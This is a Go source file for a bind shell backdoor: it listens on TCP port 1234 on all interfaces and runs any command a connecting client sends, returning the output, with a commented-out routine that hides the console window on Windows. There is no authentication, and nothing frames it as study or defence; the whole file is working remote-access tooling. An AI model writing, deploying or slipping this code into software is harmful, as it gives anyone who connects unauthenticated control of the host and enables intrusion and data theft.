package main

import (
    "bufio"
    "fmt"
    "net"
	"os"
	"os/exec"
	"strings"
    //"github.com/gonutz/w32" //Only if it is for Windows
    "runtime"
)

const (
    connHost = "0.0.0.0"
    connPort = "1234"
    connType = "tcp"
)

func main() {

    // if runtime.GOOS == "windows" {hideConsole()} //Only if it is for Windows
    l, err := net.Listen(connType, connHost+":"+connPort)
    if err != nil {
        fmt.Println("Error listening:", err.Error())
        os.Exit(1)
    }
    defer l.Close()

    for {
        c, err := l.Accept()
        if err != nil {
            fmt.Println("Error connecting:", err.Error())
            return
		}
		
        go handleConnection(c)
    }
}

func handleConnection(conn net.Conn) {
    dir, _ := os.Getwd()
	conn.Write([]byte(dir+"> "))
    buffer, err := bufio.NewReader(conn).ReadBytes('\n')

    if err != nil {
        fmt.Println("Client left.")
        conn.Close()
        return
    }

    msg := string(buffer[:len(buffer)-1])
    stripMsg := strings.Split(msg, " ")

    if stripMsg[0] == "cd" {
        os.Chdir(stripMsg[1])
        handleConnection(conn)

        return
    }

	exectionOutput, err := execCommand(msg)


	if  err != nil {
		conn.Write([]byte(err.Error() + "\n"))
	} else {
		conn.Write(exectionOutput)
	}
	
    handleConnection(conn)
}

func execCommand(comand string) ([]byte, error) {
	newArgs := strings.Split(comand, " ")
    
    var cmd = exec.Command("","")
    if runtime.GOOS == "windows" {
        args := make([]string, 1)
        args = append(args, "/c")

        for _, v := range newArgs {
            args = append(args, v)
        }
        cmd = exec.Command("cmd", args...) 
    } else {
        if len(newArgs) > 1 {
            cmd = exec.Command(newArgs[0], newArgs[1:]...)
        } else {
            cmd = exec.Command(newArgs[0])
        }
    }

	return cmd.Output()
}

/* Only if it is for Windows
func hideConsole() {
    console := w32.GetConsoleWindow()
    if console == 0 {
        return
    }
    _, consoleProcID := w32.GetWindowThreadProcessId(console)
    if w32.GetCurrentProcessId() == consoleProcID {
        w32.ShowWindowAsync(console, w32.SW_HIDE)
    }
}
*/